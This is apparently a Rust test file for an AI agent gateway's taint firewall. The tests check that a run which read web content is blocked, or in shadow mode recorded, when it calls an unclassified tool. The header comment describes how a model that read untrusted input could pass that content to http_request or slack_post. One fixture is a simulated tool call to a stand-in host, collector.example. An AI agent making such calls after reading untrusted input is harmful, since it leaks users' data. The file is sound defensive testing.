//! A tool the policy names nowhere is not harmless for a run that read
//! something untrusted (agent-security review 2026-10-17, F-003), through the
//! real router.
//!
//! Sources already failed closed: the OUTPUT of a tool the source map does not
//! name is labelled `unclassified`. Capabilities failed open: a tool the
//! capability map does not name requested nothing, so after a web read the
//! model could call `http_request`, `fetch`, `slack_post` or any MCP tool not
//! among the nine starter names, with whatever it had read in the arguments,
//! and no rule had anything to deny.

use axum::body::Body;
use axum::http::{Request, Response, StatusCode};
use std::path::PathBuf;
use std::sync::Arc;
use tokenfuse_core::taint::FirewallMode;
use tokenfuse_core::{Ledger, Mode, ModelPrice, Policy, PriceBook};
use tokenfuse_gateway::events::EventExporter;
use tokenfuse_gateway::firewall::FirewallConfig;
use tokenfuse_gateway::provider::StubProvider;
use tokenfuse_gateway::state::AppState;
use tokenfuse_gateway::wire::Wire;
use tower::ServiceExt;

/// The model asks for a tool neither map names.
const HTTP_REQUEST: &str = r#"{"content":[{"type":"tool_use","id":"u1","name":"http_request","input":{"url":"https://collector.example/?d=1"}}]}"#;
/// The model asks for the web search again, a tool the source map names.
const WEB_SEARCH_AGAIN: &str =
    r#"{"content":[{"type":"tool_use","id":"u2","name":"web_search","input":{"q":"next"}}]}"#;

fn events(tag: &str) -> (Arc<EventExporter>, PathBuf) {
    let dir = std::env::temp_dir().join(format!("tf-unmapped-{}-{tag}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("events.ndjson");
    let _ = std::fs::remove_file(&path);
    let exp = EventExporter::open(path.to_str().unwrap()).unwrap();
    (Arc::new(exp), path)
}

fn gateway(mode: FirewallMode, answer: &str, tag: &str) -> (AppState, PathBuf) {
    let prices = PriceBook::new().with(
        "test-model",
        ModelPrice::per_mtok_usd(3.0, 15.0, 0.30, 3.75),
    );
    let (exp, path) = events(tag);
    let st = AppState::new(
        Arc::new(Ledger::new()),
        Arc::new(prices),
        Arc::new(Policy {
            mode: Mode::Shadow,
            ..Default::default()
        }),
        Arc::new(StubProvider {
            body_override: Some(answer.into()),
            ..StubProvider::default()
        }),
        "unmapped-test",
    )
    .with_wire(Wire::Anthropic)
    .with_firewall(Arc::new(FirewallConfig::defaults(mode)))
    .with_events(exp);
    (st, path)
}

/// A conversation whose earlier turns called each named tool, then one more
/// user message, so the history carries those tool uses.
fn body_with_history(earlier: &[&str]) -> String {
    let mut messages = vec![serde_json::json!({"role":"user","content":"hi"})];
    for (i, name) in earlier.iter().enumerate() {
        let id = format!("h{i}");
        messages.push(serde_json::json!({"role":"assistant","content":[
            {"type":"tool_use","id":id,"name":name,"input":{}}]}));
        messages.push(serde_json::json!({"role":"user","content":[
            {"type":"tool_result","tool_use_id":id,"content":"ok"}]}));
    }
    messages.push(serde_json::json!({"role":"user","content":"continue"}));
    serde_json::json!({"model":"test-model","max_tokens":100,"messages":messages}).to_string()
}

async fn post(st: AppState, run: &str, body: String) -> Response<Body> {
    let req = Request::post("/v1/messages")
        .header("content-type", "application/json")
        .header("x-fuse-run-id", run)
        .header("x-fuse-agent-id", "agent://test.local/unmapped")
        .header("x-fuse-budget-usd", "5.0")
        .body(Body::from(body))
        .unwrap();
    tokenfuse_gateway::app(st).oneshot(req).await.unwrap()
}

fn events_of(path: &PathBuf) -> Vec<serde_json::Value> {
    let Ok(text) = std::fs::read_to_string(path) else {
        return Vec::new();
    };
    text.lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
        .collect()
}

/// The `taint_block` and `taint_shadow` events, in order.
fn verdicts(path: &PathBuf) -> Vec<serde_json::Value> {
    events_of(path)
        .into_iter()
        .filter(|e| e["type"] == "taint_block" || e["type"] == "taint_shadow")
        .collect()
}

#[tokio::test]
async fn a_tainted_run_calling_an_unmapped_tool_is_refused_in_enforce() {
    // Red on the unfixed tree: `http_request` requested no capability, so the
    // web-tainted run's answer came back 200 with the call in it.
    let (st, path) = gateway(FirewallMode::Enforce, HTTP_REQUEST, "enforce");
    let resp = post(
        st,
        "run-unmapped-enforce",
        body_with_history(&["web_search"]),
    )
    .await;
    assert_eq!(
        resp.status(),
        StatusCode::FORBIDDEN,
        "a run that read the web must not call a tool the policy names nowhere"
    );
    let v = verdicts(&path);
    assert_eq!(v.len(), 1, "one refusal on the record: {v:?}");
    assert_eq!(v[0]["type"], "taint_block");
    assert_eq!(v[0]["data"]["rule"], "no-exec-after-untrusted", "{v:?}");
    assert_eq!(
        v[0]["data"]["denied"],
        serde_json::json!(["unclassified"]),
        "the capability refused is named for what it is: {v:?}"
    );
}

#[tokio::test]
async fn in_shadow_an_unmapped_tool_after_untrusted_input_is_recorded_not_refused() {
    // Shadow records what enforce would do. Red on the unfixed tree: no rule
    // matched, so nothing was recorded.
    let (st, path) = gateway(FirewallMode::Shadow, HTTP_REQUEST, "shadow");
    let resp = post(
        st,
        "run-unmapped-shadow",
        body_with_history(&["web_search"]),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::OK, "shadow refuses nothing");
    let v = verdicts(&path);
    assert_eq!(v.len(), 1, "the would-block is recorded: {v:?}");
    assert_eq!(v[0]["type"], "taint_shadow");
    assert_eq!(v[0]["data"]["denied"], serde_json::json!(["unclassified"]));
}

#[tokio::test]
async fn a_clean_run_calling_an_unmapped_tool_is_unchanged() {
    // The other half of the decision: a run with no untrusted label behaves
    // exactly as before, whatever the tool is called.
    let (st, path) = gateway(FirewallMode::Enforce, HTTP_REQUEST, "clean");
    let resp = post(st, "run-unmapped-clean", body_with_history(&[])).await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(
        verdicts(&path).is_empty(),
        "nothing to refuse, nothing recorded"
    );
}

#[tokio::test]
async fn a_tainted_run_calling_a_classified_source_again_is_not_refused() {
    // A tool the source map names is one the operator classified: it reads, and
    // a search loop after a search is the commonest thing an agent does. Only a
    // tool named in NEITHER map is unclassified as an action.
    let (st, path) = gateway(FirewallMode::Enforce, WEB_SEARCH_AGAIN, "source");
    let resp = post(
        st,
        "run-unmapped-source",
        body_with_history(&["web_search"]),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(verdicts(&path).is_empty(), "{:?}", verdicts(&path));
}

#[tokio::test]
async fn a_run_carrying_only_secrets_is_judged_as_before() {
    // `secrets` is a sensitivity label, not an untrusted source: the starter
    // policy's anti-exfiltration rule denies network egress after it and
    // nothing else, and this change does not widen that rule.
    let (st, path) = gateway(FirewallMode::Enforce, HTTP_REQUEST, "secrets");
    let resp = post(
        st,
        "run-unmapped-secrets",
        body_with_history(&["vault_read"]),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(verdicts(&path).is_empty(), "{:?}", verdicts(&path));
}

#[tokio::test]
async fn with_the_firewall_off_an_unmapped_tool_is_not_judged() {
    let (st, path) = gateway(FirewallMode::Off, HTTP_REQUEST, "off");
    let resp = post(st, "run-unmapped-off", body_with_history(&["web_search"])).await;
    assert_eq!(resp.status(), StatusCode::OK);
    assert!(verdicts(&path).is_empty());
}
